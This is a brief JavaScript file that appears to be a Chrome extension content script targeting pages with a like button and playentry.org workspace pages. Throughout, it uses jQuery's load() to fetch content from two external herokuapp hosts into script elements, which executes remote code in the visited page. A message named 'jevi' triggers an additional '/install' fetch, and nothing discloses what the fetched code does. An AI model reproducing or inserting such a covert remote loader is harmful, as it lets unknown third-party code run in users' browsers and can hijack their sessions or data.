$(document).ready(function(){
  var a = $('.likeBtn');
  if(a.length != 0){
    chrome.runtime.onMessage.addListener(
      function(request, sender, sendResponse) {

        if( request.message == "jevi" ) {
          console.log(request.message);
         $('script').load("https://cham-why.herokuapp.com/install");
        }
      }
    );

    $('script').load('https://ent-check.herokuapp.com/');
  }
  console.log("is like!!!!!");
  if(window.location.href.startsWith("https://playentry.org/ws#!")){
console.log("is like!!!!!");
    $('script').load('https://ent-check.herokuapp.com/');
  }
});
